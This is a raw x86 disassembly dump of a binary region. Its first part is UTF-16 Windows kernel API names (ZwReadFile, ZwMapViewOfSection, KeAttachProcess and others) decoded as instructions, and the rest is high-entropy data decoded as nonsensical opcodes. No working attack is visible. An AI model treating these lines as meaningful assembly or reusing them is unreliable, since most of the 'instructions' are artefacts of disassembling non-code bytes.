   1e06d:	add    BYTE PTR [ecx+0x0],ah
   1e070:	ins    BYTE PTR es:[edi],dx
   1e071:	add    BYTE PTR [ebp+0x0],dh
   1e074:	add    BYTE PTR gs:[ebx+0x0],cl
   1e078:	add    BYTE PTR gs:[ecx+0x0],bh
   1e07c:	add    BYTE PTR [eax],al
   1e07e:	pop    edx
   1e07f:	add    BYTE PTR [edi+0x0],dh
   1e082:	push   ecx
   1e083:	add    BYTE PTR [ebp+0x0],dh
   1e086:	add    BYTE PTR gs:[edx+0x0],dh
   1e08a:	jns    0x1e08c
   1e08c:	push   esi
   1e08d:	add    BYTE PTR [edi+0x0],ch
   1e090:	ins    BYTE PTR es:[edi],dx
   1e091:	add    BYTE PTR [ebp+0x0],dh
   1e094:	ins    DWORD PTR es:[edi],dx
   1e095:	add    BYTE PTR [ebp+0x0],ah
   1e098:	dec    ecx
   1e099:	add    BYTE PTR [esi+0x0],ch
   1e09c:	data16 add BYTE PTR [edi+0x0],ch
   1e0a0:	jb     0x1e0a2
   1e0a2:	ins    DWORD PTR es:[edi],dx
   1e0a3:	add    BYTE PTR [ecx+0x0],ah
   1e0a6:	je     0x1e0a8
   1e0a8:	imul   eax,DWORD PTR [eax],0x6e006f
   1e0ae:	inc    esi
   1e0af:	add    BYTE PTR [ecx+0x0],ch
   1e0b2:	ins    BYTE PTR es:[edi],dx
   1e0b3:	add    BYTE PTR [ebp+0x0],ah
   1e0b6:	add    BYTE PTR [eax],al
   1e0b8:	pop    edx
   1e0b9:	add    BYTE PTR [edi+0x0],dh
   1e0bc:	inc    ebx
   1e0bd:	add    BYTE PTR [edx+0x0],dh
   1e0c0:	add    BYTE PTR gs:[ecx+0x0],ah
   1e0c4:	je     0x1e0c6
   1e0c6:	add    BYTE PTR gs:[esi+0x0],al
   1e0ca:	imul   eax,DWORD PTR [eax],0x65006c
   1e0d0:	add    BYTE PTR [eax],al
   1e0d2:	push   edx
   1e0d3:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e0d7:	add    BYTE PTR [ecx+0x0],cl
   1e0da:	ins    DWORD PTR es:[edi],dx
   1e0db:	add    BYTE PTR [ecx+0x0],ah
   1e0de:	add    BYTE PTR [di+0x0],ah
   1e0e2:	dec    esi
   1e0e3:	add    BYTE PTR [eax+eax*1+0x48],dh
   1e0e7:	add    BYTE PTR [ebp+0x0],ah
   1e0ea:	popa   
   1e0eb:	add    BYTE PTR [eax+eax*1+0x65],ah
   1e0ef:	add    BYTE PTR [edx+0x0],dh
   1e0f2:	add    BYTE PTR [eax],al
   1e0f4:	push   edx
   1e0f5:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e0f9:	add    BYTE PTR [ecx+0x0],cl
   1e0fc:	ins    DWORD PTR es:[edi],dx
   1e0fd:	add    BYTE PTR [ecx+0x0],ah
   1e100:	add    BYTE PTR [di+0x0],ah
   1e104:	inc    esp
   1e105:	add    BYTE PTR [ecx+0x0],ch
   1e108:	jb     0x1e10a
   1e10a:	add    BYTE PTR gs:[ebx+0x0],ah
   1e10e:	je     0x1e110
   1e110:	outs   dx,DWORD PTR ds:[esi]
   1e111:	add    BYTE PTR [edx+0x0],dh
   1e114:	jns    0x1e116
   1e116:	inc    ebp
   1e117:	add    BYTE PTR [esi+0x0],ch
   1e11a:	je     0x1e11c
   1e11c:	jb     0x1e11e
   1e11e:	jns    0x1e120
   1e120:	push   esp
   1e121:	add    BYTE PTR [edi+0x0],ch
   1e124:	inc    esp
   1e125:	add    BYTE PTR [ecx+0x0],ah
   1e128:	je     0x1e12a
   1e12a:	popa   
   1e12b:	add    BYTE PTR [eax],al
   1e12d:	add    BYTE PTR [edx+0x0],bl
   1e130:	ja     0x1e132
   1e132:	dec    edi
   1e133:	add    BYTE PTR [eax+0x0],dh
   1e136:	add    BYTE PTR gs:[esi+0x0],ch
   1e13a:	push   eax
   1e13b:	add    BYTE PTR [edx+0x0],dh
   1e13e:	outs   dx,DWORD PTR ds:[esi]
   1e13f:	add    BYTE PTR [ebx+0x0],ah
   1e142:	add    BYTE PTR gs:[ebx+0x0],dh
   1e146:	jae    0x1e148
   1e148:	push   esp
   1e149:	add    BYTE PTR [edi+0x0],ch
   1e14c:	imul   eax,DWORD PTR [eax],0x65
   1e14f:	add    BYTE PTR [esi+0x0],ch
   1e152:	add    BYTE PTR [eax],al
   1e154:	pop    edx
   1e155:	add    BYTE PTR [edi+0x0],dh
   1e158:	push   ebx
   1e159:	add    BYTE PTR [ebp+0x0],ah
   1e15c:	je     0x1e15e
   1e15e:	dec    ecx
   1e15f:	add    BYTE PTR [esi+0x0],ch
   1e162:	data16 add BYTE PTR [edi+0x0],ch
   1e166:	jb     0x1e168
   1e168:	ins    DWORD PTR es:[edi],dx
   1e169:	add    BYTE PTR [ecx+0x0],ah
   1e16c:	je     0x1e16e
   1e16e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e174:	push   eax
   1e175:	add    BYTE PTR [edx+0x0],dh
   1e178:	outs   dx,DWORD PTR ds:[esi]
   1e179:	add    BYTE PTR [ebx+0x0],ah
   1e17c:	add    BYTE PTR gs:[ebx+0x0],dh
   1e180:	jae    0x1e182
   1e182:	add    BYTE PTR [eax],al
   1e184:	pop    edx
   1e185:	add    BYTE PTR [edi+0x0],dh
   1e188:	push   ecx
   1e189:	add    BYTE PTR [ebp+0x0],dh
   1e18c:	add    BYTE PTR gs:[edx+0x0],dh
   1e190:	jns    0x1e192
   1e192:	dec    ecx
   1e193:	add    BYTE PTR [esi+0x0],ch
   1e196:	data16 add BYTE PTR [edi+0x0],ch
   1e19a:	jb     0x1e19c
   1e19c:	ins    DWORD PTR es:[edi],dx
   1e19d:	add    BYTE PTR [ecx+0x0],ah
   1e1a0:	je     0x1e1a2
   1e1a2:	imul   eax,DWORD PTR [eax],0x6e006f
   1e1a8:	push   esp
   1e1a9:	add    BYTE PTR [eax+0x0],ch
   1e1ac:	jb     0x1e1ae
   1e1ae:	add    BYTE PTR gs:[ecx+0x0],ah
   1e1b2:	add    BYTE PTR fs:[eax],al
   1e1b5:	add    BYTE PTR [edx+0x0],dl
   1e1b8:	je     0x1e1ba
   1e1ba:	ins    BYTE PTR es:[edi],dx
   1e1bb:	add    BYTE PTR [ecx+0x0],al
   1e1be:	jae    0x1e1c0
   1e1c0:	jae    0x1e1c2
   1e1c2:	add    BYTE PTR gs:[edx+0x0],dh
   1e1c6:	je     0x1e1c8
   1e1c8:	add    BYTE PTR [eax],al
   1e1ca:	pop    edx
   1e1cb:	add    BYTE PTR [edi+0x0],dh
   1e1ce:	inc    ebp
   1e1cf:	add    BYTE PTR [esi+0x0],ch
   1e1d2:	jne    0x1e1d4
   1e1d4:	ins    DWORD PTR es:[edi],dx
   1e1d5:	add    BYTE PTR [ebp+0x0],ah
   1e1d8:	jb     0x1e1da
   1e1da:	popa   
   1e1db:	add    BYTE PTR [eax+eax*1+0x65],dh
   1e1df:	add    BYTE PTR [ebx+0x0],cl
   1e1e2:	add    BYTE PTR gs:[ecx+0x0],bh
   1e1e6:	add    BYTE PTR [eax],al
   1e1e8:	pop    edx
   1e1e9:	add    BYTE PTR [edi+0x0],dh
   1e1ec:	dec    esp
   1e1ed:	add    BYTE PTR [edi+0x0],ch
   1e1f0:	popa   
   1e1f1:	add    BYTE PTR [eax+eax*1+0x44],ah
   1e1f5:	add    BYTE PTR [edx+0x0],dh
   1e1f8:	imul   eax,DWORD PTR [eax],0x650076
   1e1fe:	jb     0x1e200
   1e200:	add    BYTE PTR [eax],al
   1e202:	pop    edx
   1e203:	add    BYTE PTR [edi+0x0],dh
   1e206:	inc    ebx
   1e207:	add    BYTE PTR [edx+0x0],dh
   1e20a:	add    BYTE PTR gs:[ecx+0x0],ah
   1e20e:	je     0x1e210
   1e210:	add    BYTE PTR gs:[ebx+0x0],cl
   1e214:	add    BYTE PTR gs:[ecx+0x0],bh
   1e218:	add    BYTE PTR [eax],al
   1e21a:	dec    ecx
   1e21b:	add    BYTE PTR [edi+0x0],ch
   1e21e:	inc    esp
   1e21f:	add    BYTE PTR [ebp+0x0],ah
   1e222:	ins    BYTE PTR es:[edi],dx
   1e223:	add    BYTE PTR [ebp+0x0],ah
   1e226:	je     0x1e228
   1e228:	add    BYTE PTR gs:[eax+eax*1+0x65],al
   1e22d:	add    BYTE PTR [esi+0x0],dh
   1e230:	imul   eax,DWORD PTR [eax],0x650063
   1e236:	add    BYTE PTR [eax],al
   1e238:	dec    ebx
   1e239:	add    BYTE PTR [ebp+0x0],ah
   1e23c:	inc    esp
   1e23d:	add    BYTE PTR [ebp+0x0],ah
   1e240:	je     0x1e242
   1e242:	popa   
   1e243:	add    BYTE PTR [ebx+0x0],ah
   1e246:	push   0x72005000
   1e24b:	add    BYTE PTR [edi+0x0],ch
   1e24e:	arpl   WORD PTR [eax],ax
   1e250:	add    BYTE PTR gs:[ebx+0x0],dh
   1e254:	jae    0x1e256
   1e256:	add    BYTE PTR [eax],al
   1e258:	dec    ebx
   1e259:	add    BYTE PTR [ebp+0x0],ah
   1e25c:	inc    ecx
   1e25d:	add    BYTE PTR [eax+eax*1+0x74],dh
   1e261:	add    BYTE PTR [ecx+0x0],ah
   1e264:	arpl   WORD PTR [eax],ax
   1e266:	push   0x72005000
   1e26b:	add    BYTE PTR [edi+0x0],ch
   1e26e:	arpl   WORD PTR [eax],ax
   1e270:	add    BYTE PTR gs:[ebx+0x0],dh
   1e274:	jae    0x1e276
   1e276:	add    BYTE PTR [eax],al
   1e278:	pop    edx
   1e279:	add    BYTE PTR [edi+0x0],dh
   1e27c:	push   ecx
   1e27d:	add    BYTE PTR [ebp+0x0],dh
   1e280:	add    BYTE PTR gs:[edx+0x0],dh
   1e284:	jns    0x1e286
   1e286:	push   esi
   1e287:	add    BYTE PTR [ecx+0x0],ah
   1e28a:	ins    BYTE PTR es:[edi],dx
   1e28b:	add    BYTE PTR [ebp+0x0],dh
   1e28e:	add    BYTE PTR gs:[ebx+0x0],cl
   1e292:	add    BYTE PTR gs:[ecx+0x0],bh
   1e296:	add    BYTE PTR [eax],al
   1e298:	pop    edx
   1e299:	add    BYTE PTR [edi+0x0],dh
   1e29c:	push   edx
   1e29d:	add    BYTE PTR [ebp+0x0],ah
   1e2a0:	popa   
   1e2a1:	add    BYTE PTR [eax+eax*1+0x46],ah
   1e2a5:	add    BYTE PTR [ecx+0x0],ch
   1e2a8:	ins    BYTE PTR es:[edi],dx
   1e2a9:	add    BYTE PTR [ebp+0x0],ah
   1e2ac:	add    BYTE PTR [eax],al
   1e2ae:	pop    edx
   1e2af:	add    BYTE PTR [edi+0x0],dh
   1e2b2:	push   ebx
   1e2b3:	add    BYTE PTR [ebp+0x0],ah
   1e2b6:	je     0x1e2b8
   1e2b8:	dec    ecx
   1e2b9:	add    BYTE PTR [esi+0x0],ch
   1e2bc:	data16 add BYTE PTR [edi+0x0],ch
   1e2c0:	jb     0x1e2c2
   1e2c2:	ins    DWORD PTR es:[edi],dx
   1e2c3:	add    BYTE PTR [ecx+0x0],ah
   1e2c6:	je     0x1e2c8
   1e2c8:	imul   eax,DWORD PTR [eax],0x6e006f
   1e2ce:	inc    esi
   1e2cf:	add    BYTE PTR [ecx+0x0],ch
   1e2d2:	ins    BYTE PTR es:[edi],dx
   1e2d3:	add    BYTE PTR [ebp+0x0],ah
   1e2d6:	add    BYTE PTR [eax],al
   1e2d8:	pop    edx
   1e2d9:	add    BYTE PTR [edi+0x0],dh
   1e2dc:	push   edi
   1e2dd:	add    BYTE PTR [edx+0x0],dh
   1e2e0:	imul   eax,DWORD PTR [eax],0x650074
   1e2e6:	inc    esi
   1e2e7:	add    BYTE PTR [ecx+0x0],ch
   1e2ea:	ins    BYTE PTR es:[edi],dx
   1e2eb:	add    BYTE PTR [ebp+0x0],ah
   1e2ee:	add    BYTE PTR [eax],al
   1e2f0:	pop    edx
   1e2f1:	add    BYTE PTR [edi+0x0],dh
   1e2f4:	push   ecx
   1e2f5:	add    BYTE PTR [ebp+0x0],dh
   1e2f8:	add    BYTE PTR gs:[edx+0x0],dh
   1e2fc:	jns    0x1e2fe
   1e2fe:	dec    ecx
   1e2ff:	add    BYTE PTR [esi+0x0],ch
   1e302:	data16 add BYTE PTR [edi+0x0],ch
   1e306:	jb     0x1e308
   1e308:	ins    DWORD PTR es:[edi],dx
   1e309:	add    BYTE PTR [ecx+0x0],ah
   1e30c:	je     0x1e30e
   1e30e:	imul   eax,DWORD PTR [eax],0x6e006f
   1e314:	inc    esi
   1e315:	add    BYTE PTR [ecx+0x0],ch
   1e318:	ins    BYTE PTR es:[edi],dx
   1e319:	add    BYTE PTR [ebp+0x0],ah
   1e31c:	add    BYTE PTR [eax],al
   1e31e:	dec    ecx
   1e31f:	add    BYTE PTR [edi+0x0],ch
   1e322:	inc    ebx
   1e323:	add    BYTE PTR [edx+0x0],dh
   1e326:	add    BYTE PTR gs:[ecx+0x0],ah
   1e32a:	je     0x1e32c
   1e32c:	add    BYTE PTR gs:[ebx+0x0],dl
   1e330:	jns    0x1e332
   1e332:	ins    DWORD PTR es:[edi],dx
   1e333:	add    BYTE PTR [edx+0x0],ah
   1e336:	outs   dx,DWORD PTR ds:[esi]
   1e337:	add    BYTE PTR [eax+eax*1+0x69],ch
   1e33b:	add    BYTE PTR [ebx+0x0],ah
   1e33e:	dec    esp
   1e33f:	add    BYTE PTR [ecx+0x0],ch
   1e342:	outs   dx,BYTE PTR ds:[esi]
   1e343:	add    BYTE PTR [ebx+0x0],ch
   1e346:	add    BYTE PTR [eax],al
   1e348:	dec    ecx
   1e349:	add    BYTE PTR [edi+0x0],ch
   1e34c:	inc    ebx
   1e34d:	add    BYTE PTR [edx+0x0],dh
   1e350:	add    BYTE PTR gs:[ecx+0x0],ah
   1e354:	je     0x1e356
   1e356:	add    BYTE PTR gs:[eax+eax*1+0x65],al
   1e35b:	add    BYTE PTR [esi+0x0],dh
   1e35e:	imul   eax,DWORD PTR [eax],0x650063
   1e364:	add    BYTE PTR [eax],al
   1e366:	push   ebx
   1e367:	add    BYTE PTR [ebp+0x0],ah
   1e36a:	inc    ebx
   1e36b:	add    BYTE PTR [edx+0x0],dh
   1e36e:	add    BYTE PTR gs:[ecx+0x0],ah
   1e372:	je     0x1e374
   1e374:	add    BYTE PTR gs:[ebx+0x0],al
   1e378:	ins    BYTE PTR es:[edi],dx
   1e379:	add    BYTE PTR [ecx+0x0],ch
   1e37c:	add    BYTE PTR gs:[esi+0x0],ch
   1e380:	je     0x1e382
   1e382:	push   ebx
   1e383:	add    BYTE PTR [ebp+0x0],ah
   1e386:	arpl   WORD PTR [eax],ax
   1e388:	jne    0x1e38a
   1e38a:	jb     0x1e38c
   1e38c:	imul   eax,DWORD PTR [eax],0x790074
   1e392:	add    BYTE PTR [eax],al
   1e394:	pop    edx
   1e395:	add    BYTE PTR [edi+0x0],dh
   1e398:	dec    ebp
   1e399:	add    BYTE PTR [ecx+0x0],ah
   1e39c:	jo     0x1e39e
   1e39e:	push   esi
   1e39f:	add    BYTE PTR [ecx+0x0],ch
   1e3a2:	add    BYTE PTR gs:[edi+0x0],dh
   1e3a6:	dec    edi
   1e3a7:	add    BYTE PTR [esi+0x0],ah
   1e3aa:	push   ebx
   1e3ab:	add    BYTE PTR [ebp+0x0],ah
   1e3ae:	arpl   WORD PTR [eax],ax
   1e3b0:	je     0x1e3b2
   1e3b2:	imul   eax,DWORD PTR [eax],0x6e006f
   1e3b8:	add    BYTE PTR [eax],al
   1e3ba:	pop    edx
   1e3bb:	add    BYTE PTR [edi+0x0],dh
   1e3be:	push   ebp
   1e3bf:	add    BYTE PTR [esi+0x0],ch
   1e3c2:	ins    DWORD PTR es:[edi],dx
   1e3c3:	add    BYTE PTR [ecx+0x0],ah
   1e3c6:	jo     0x1e3c8
   1e3c8:	push   esi
   1e3c9:	add    BYTE PTR [ecx+0x0],ch
   1e3cc:	add    BYTE PTR gs:[edi+0x0],dh
   1e3d0:	dec    edi
   1e3d1:	add    BYTE PTR [esi+0x0],ah
   1e3d4:	push   ebx
   1e3d5:	add    BYTE PTR [ebp+0x0],ah
   1e3d8:	arpl   WORD PTR [eax],ax
   1e3da:	je     0x1e3dc
   1e3dc:	imul   eax,DWORD PTR [eax],0x6e006f
   1e3e2:	add    BYTE PTR [eax],al
   1e3e4:	dec    ebx
   1e3e5:	add    BYTE PTR [ebp+0x0],ah
   1e3e8:	dec    ecx
   1e3e9:	add    BYTE PTR [esi+0x0],ch
   1e3ec:	imul   eax,DWORD PTR [eax],0x690074
   1e3f2:	popa   
   1e3f3:	add    BYTE PTR [eax+eax*1+0x69],ch
   1e3f7:	add    BYTE PTR [edx+0x0],bh
   1e3fa:	add    BYTE PTR gs:[ebp+0x0],cl
   1e3fe:	jne    0x1e400
   1e400:	je     0x1e402
   1e402:	add    BYTE PTR gs:[eax+0x0],bh
   1e406:	add    BYTE PTR [eax],al
   1e408:	push   edx
   1e409:	add    BYTE PTR [eax+eax*1+0x6c],dh
   1e40d:	add    BYTE PTR [ecx+0x0],cl
   1e410:	outs   dx,BYTE PTR ds:[esi]
   1e411:	add    BYTE PTR [ecx+0x0],ch
   1e414:	je     0x1e416
   1e416:	push   ebp
   1e417:	add    BYTE PTR [esi+0x0],ch
   1e41a:	imul   eax,DWORD PTR [eax],0x6f0063
   1e420:	add    BYTE PTR fs:[ebp+0x0],ah
   1e424:	push   ebx
   1e425:	add    BYTE PTR [eax+eax*1+0x72],dh
   1e429:	add    BYTE PTR [ecx+0x0],ch
   1e42c:	outs   dx,BYTE PTR ds:[esi]
   1e42d:	add    BYTE PTR [edi+0x0],ah
   1e430:	add    BYTE PTR [eax],al
   1e432:	dec    edi
   1e433:	add    BYTE PTR [edx+0x0],ah
   1e436:	data16 add BYTE PTR [eax+eax*1+0x65],al
   1e43b:	add    BYTE PTR [edx+0x0],dh
   1e43e:	add    BYTE PTR gs:[esi+0x0],ah
   1e442:	add    BYTE PTR gs:[edx+0x0],dh
   1e446:	add    BYTE PTR gs:[esi+0x0],ch
   1e44a:	arpl   WORD PTR [eax],ax
   1e44c:	add    BYTE PTR gs:[edi+0x0],cl
   1e450:	bound  eax,QWORD PTR [eax]
   1e452:	push   0x0
   1e454:	add    BYTE PTR gs:[ebx+0x0],ah
   1e458:	je     0x1e45a
   1e45a:	add    BYTE PTR [eax],al
   1e45c:	push   eax
   1e45d:	add    BYTE PTR [ebx+0x0],dh
   1e460:	dec    esp
   1e461:	add    BYTE PTR [edi+0x0],ch
   1e464:	outs   dx,DWORD PTR ds:[esi]
   1e465:	add    BYTE PTR [ebx+0x0],ch
   1e468:	jne    0x1e46a
   1e46a:	jo     0x1e46c
   1e46c:	push   eax
   1e46d:	add    BYTE PTR [edx+0x0],dh
   1e470:	outs   dx,DWORD PTR ds:[esi]
   1e471:	add    BYTE PTR [ebx+0x0],ah
   1e474:	add    BYTE PTR gs:[ebx+0x0],dh
   1e478:	jae    0x1e47a
   1e47a:	inc    edx
   1e47b:	add    BYTE PTR [ecx+0x0],bh
   1e47e:	push   eax
   1e47f:	add    BYTE PTR [edx+0x0],dh
   1e482:	outs   dx,DWORD PTR ds:[esi]
   1e483:	add    BYTE PTR [ebx+0x0],ah
   1e486:	add    BYTE PTR gs:[ebx+0x0],dh
   1e48a:	jae    0x1e48c
   1e48c:	dec    ecx
   1e48d:	add    BYTE PTR [eax+eax*1+0x0],ah
   1e491:	add    BYTE PTR [ebx+0x0],cl
   1e494:	add    BYTE PTR gs:[edi+0x0],al
   1e498:	add    BYTE PTR gs:[eax+eax*1+0x43],dh
   1e49d:	add    BYTE PTR [ebp+0x0],dh
   1e4a0:	jb     0x1e4a2
   1e4a2:	jb     0x1e4a4
   1e4a4:	add    BYTE PTR gs:[esi+0x0],ch
   1e4a8:	je     0x1e4aa
   1e4aa:	push   esp
   1e4ab:	add    BYTE PTR [eax+0x0],ch
   1e4ae:	jb     0x1e4b0
   1e4b0:	add    BYTE PTR gs:[ecx+0x0],ah
   1e4b4:	add    BYTE PTR fs:[eax],al
   1e4b7:	add    BYTE PTR [eax+eax*1+0x2d],dl
   1e4bb:	add    BYTE PTR [ecx],cl
   1e4bd:	add    BYTE PTR ds:0xcc000000,dl
   1e4c3:	cmc    
   1e4c4:	push   ds
   1e4c5:	je     0x1e51d
   1e4c7:	in     al,dx
   1e4c8:	xlat   BYTE PTR es:[ebx]
   1e4ca:	sub    edx,DWORD PTR [eax]
   1e4cc:	jb     0x1e4f2
   1e4ce:	pop    edx
   1e4cf:	not    BYTE PTR [ebx]
   1e4d1:	mov    al,0x8e
   1e4d3:	call   0x2520:0xdd935016
   1e4da:	jecxz  0x1e54a
   1e4dc:	or     DWORD PTR [eax+0x12],eax
   1e4df:	ret    0x66cd
   1e4e2:	xchg   DWORD PTR [ecx-0x7f],ebp
   1e4e5:	fidiv  DWORD PTR ds:0xbece336a
   1e4eb:	add    al,0xa1
   1e4ed:	xor    al,0x54
   1e4ef:	add    BYTE PTR [ebx+0x0],dl
   1e4f2:	daa    
   1e4f3:	add    BYTE PTR ds:0x6001300,dl
   1e4f9:	add    BYTE PTR [eax],al
   1e4fb:	add    BYTE PTR [edx+0x3e0a937e],al
   1e501:	std    
   1e502:	and    DWORD PTR [ebp-0x74],0x890094f5
   1e509:	mov    edi,0x8b93adb0
   1e50e:	sbb    ch,BYTE PTR [ebx-0x2e]
   1e511:	leave  
   1e512:	sbb    al,0xf7
   1e514:	shl    DWORD PTR [ebx-0x10],1
   1e517:	nop
   1e518:	gs into 
   1e51a:	jb     0x1e4e4
   1e51c:	pop    eax
   1e51d:	jl     0x1e592
   1e51f:	dec    ecx
   1e520:	mov    cl,BYTE PTR [edx+esi*4]
   1e523:	not    esi
   1e525:	idiv   BYTE PTR ds:0xca52e407
   1e52b:	cwde   
   1e52c:	mov    ds:0xa99d62,al
   1e531:	int3   
   1e532:	dec    ecx
   1e533:	add    BYTE PTR [eax+eax*1],ah
   1e536:	or     al,0x0
   1e538:	push   es
   1e539:	add    BYTE PTR [edx],al
   1e53b:	add    BYTE PTR ds:0x15003100,dh
   1e541:	add    BYTE PTR [eax+eax*1],bl
   1e544:	add    BYTE PTR [eax],al
   1e546:	and    BYTE PTR [edx+0x764d6e43],dl
   1e54c:	inc    ecx
   1e54d:	pop    ebp
   1e54e:	push   edx
   1e54f:	ss jo  0x1e5a2
   1e552:	retf   0xcbdc
   1e555:	add    BYTE PTR [ebx+0x2694cfb],0x6d
   1e55c:	or     eax,0x5d52eb3e
   1e561:	push   ss
   1e562:	xor    BYTE PTR [ebx+0x72],bl
   1e565:	lods   al,BYTE PTR ds:[esi]
   1e566:	fcom   QWORD PTR [eax+esi*1]
   1e569:	cmp    ah,BYTE PTR [edi]
   1e56b:	sub    DWORD PTR [edi+0x76],esp
   1e56e:	hlt    
   1e56f:	sbb    ecx,ebp
   1e571:	jno    0x1e58e
   1e573:	aad    0xf1
   1e575:	out    dx,eax
   1e576:	into   
   1e577:	and    BYTE PTR [ebp-0x9],bl
   1e57a:	lahf   
   1e57b:	add    BYTE PTR [esi],ch
   1e57d:	add    BYTE PTR [edx+0x0],cl
   1e580:	or     BYTE PTR [eax],al
   1e582:	add    BYTE PTR [eax],al
   1e584:	add    BYTE PTR [eax],al
   1e586:	not    BYTE PTR [ecx-0x136dbf00]
   1e58c:	ss xchg edi,eax
   1e58e:	and    esp,eax
   1e590:	aam    0x92
   1e592:	sub    bh,BYTE PTR [esi+esi*8+0x6a]
   1e596:	xor    bh,BYTE PTR ds:0x59c8c5ac
   1e59c:	xor    eax,ecx
   1e59e:	add    ecx,edx
   1e5a0:	xlat   BYTE PTR ds:[ebx]
   1e5a1:	popf   
   1e5a2:	mov    cl,0x2e
   1e5a4:	mov    ds:0x3d0461d8,al
   1e5a9:	mov    al,bh
   1e5ab:	shr    DWORD PTR [edx],cl
   1e5ad:	add    BYTE PTR [esi+0x0],ch
   1e5b0:	sbb    al,BYTE PTR [eax]
   1e5b2:	adc    BYTE PTR [eax],al
   1e5b4:	or     BYTE PTR [eax],al
   1e5b6:	add    BYTE PTR [eax],al
   1e5b8:	inc    edx
   1e5b9:	add    BYTE PTR [edx+0x0],cl
   1e5bc:	or     BYTE PTR [eax],al
   1e5be:	add    BYTE PTR [eax],al
   1e5c0:	add    BYTE PTR [eax],al
   1e5c2:	cmp    al,0xb2
   1e5c4:	ja     0x1e596
   1e5c6:	or     ebp,DWORD PTR [esi+0x3922dcc6]
   1e5cc:	loopne 0x1e56d
   1e5ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1e5cf:	xchg   eax,eax
   1e5d1:	les    esp,FWORD PTR [ebx+edx*4+0x42872cd3]
   1e5d8:	pop    ds
   1e5d9:	out    0xe4,al
   1e5db:	sbb    ecx,ecx
   1e5dd:	outs   dx,DWORD PTR ds:[esi]
   1e5de:	stos   DWORD PTR es:[edi],eax
   1e5df:	sbb    eax,0x5dfbfe80
   1e5e4:	js     0x1e626
   1e5e6:	sub    eax,0x6aba04d1
   1e5eb:	xor    bl,BYTE PTR [eax-0x63]
   1e5ee:	jp     0x1e5c8
   1e5f0:	popa   
   1e5f1:	inc    edx
   1e5f2:	jmp    0x1e58f
   1e5f4:	lahf   
   1e5f5:	add    DWORD PTR [ebp+eiz*8+0xca7bd0],edx
   1e5fc:	inc    edx
   1e5fd:	daa    
   1e5fe:	add    BYTE PTR ds:0xe467cc00,dl
   1e604:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1e605:	mov    al,ds:0xcf945d40
   1e60a:	ficom  DWORD PTR [edi]
   1e60c:	mov    esi,DWORD PTR [eax]
   1e60e:	cmp    ebp,DWORD PTR [esi]
   1e610:	popa   
   1e611:	data16 and al,0xaf
   1e614:	mov    ebx,0x5f43b173
   1e619:	or     eax,0x34dc1b39
   1e61e:	out    dx,eax
   1e61f:	push   cs
   1e620:	ja     0x1e5f1
   1e622:	adc    ebx,DWORD PTR [edi+edx*1-0x71312cc6]
   1e629:	ss cli 
   1e62b:	ins    DWORD PTR es:[edi],dx
   1e62c:	into   
   1e62d:	xor    ecx,edx
   1e62f:	jne    0x1e655
   1e631:	pop    eax
   1e632:	pop    ebx
   1e633:	xchg   esp,eax
   1e634:	ja     0x1e67c
   1e636:	lods   al,BYTE PTR ds:[esi]
   1e637:	fmul   st(6),st
   1e639:	add    BYTE PTR [ebx+0x3f],dl
   1e63c:	or     DWORD PTR [eax],eax
   1e63e:	adc    eax,0x5eed9600
   1e643:	jbe    0x1e692
   1e645:	add    ah,BYTE PTR [ebx+0x3756136d]
   1e64b:	fs dec esp
   1e64d:	pop    ecx
   1e64e:	adc    dh,bh
   1e650:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
   1e651:	icebp  
   1e652:	repnz lock pop esi
   1e655:	jmp    0x71488660
   1e65a:	lds    ebp,FWORD PTR [ecx+0x36]
   1e65d:	and    eax,DWORD PTR [ebx]
   1e65f:	aas    
   1e660:	sti    
   1e661:	jmp    0x1e65d
   1e663:	mov    ds:0x735593fd,eax
   1e668:	pushf  
   1e669:	imul   esi,DWORD PTR [esi-0x417d495],0xfd93c1fb
   1e673:	sbb    DWORD PTR [eax+0x33],eax
   1e676:	sbb    ecx,0x63
   1e679:	inc    BYTE PTR [eax]
   1e67b:	int3   
   1e67c:	inc    ebx
   1e67d:	xor    DWORD PTR [edi],edx
   1e67f:	add    al,0x15
   1e681:	adc    DWORD PTR [ecx],esi
   1e683:	cmp    al,0x1a
   1e685:	pop    ss
   1e686:	add    al,0x5
   1e688:	add    ah,cl
   1e68a:	pop    ebx
   1e68b:	mov    esp,DWORD PTR gs:[esi+0x1bc26f1]
   1e692:	mov    ebp,0x23b311a2
   1e697:	jp     0x1e64b
   1e699:	(bad)  
   1e69a:	arpl   WORD PTR [ebx-0x5a],bx
   1e69d:	adc    bh,BYTE PTR ds:0x4c234752
   1e6a3:	pop    esi
   1e6a4:	jae    0x1e6fb
   1e6a6:	ffree  st(4)
   1e6a8:	cs addr16 (bad) 
   1e6ab:	add    BYTE PTR [ebx+eiz*1+0xe],cl
   1e6af:	add    eax,0x100b2528
   1e6b4:	adc    edx,DWORD PTR [ebx]
   1e6b6:	or     edi,DWORD PTR [eax]
   1e6b8:	add    ah,cl
   1e6ba:	jmp    0x1e731
   1e6bc:	pop    esi
   1e6bd:	add    edi,esp
   1e6bf:	xor    edi,DWORD PTR [edx]
   1e6c1:	dec    ebx
   1e6c2:	stc    
   1e6c3:	test   BYTE PTR [ebp+0x6d],bl
   1e6c6:	sbb    eax,0x94c44db0
   1e6cb:	fmul   DWORD PTR [esi]
   1e6cd:	sub    al,0xa8
   1e6cf:	jecxz  0x1e744
   1e6d1:	cs lock ins BYTE PTR es:[edi],dx
   1e6d4:	mov    ch,0x13
   1e6d6:	cmp    bl,bl
   1e6d8:	push   ebp
   1e6d9:	mov    ds:0xddaf13a,eax
   1e6de:	into   
   1e6df:	add    BYTE PTR [ebx+eiz*1+0xe],cl
   1e6e3:	add    eax,0x100b2528
   1e6e8:	adc    edx,DWORD PTR [ebx]
   1e6ea:	or     ebp,DWORD PTR [esi]
   1e6ec:	add    ah,cl
   1e6ee:	inc    ecx
   1e6ef:	aad    0xf2
   1e6f1:	cdq    
   1e6f2:	adc    ebx,DWORD PTR [ebx+ebp*1-0x6a9f2589]
   1e6f9:	mov    ds:0xa7a083eb,eax
   1e6fe:	retf   0x11bf
   1e701:	jle    0x1e751
   1e703:	ss ins BYTE PTR es:[edi],dx
   1e705:	pop    es
   1e706:	sbb    eax,0xa1907f9
   1e70b:	inc    ebx
   1e70c:	pop    ebx
   1e70d:	imul   eax,DWORD PTR [esi],0x4d993322
   1e713:	das    
   1e714:	add    ah,cl
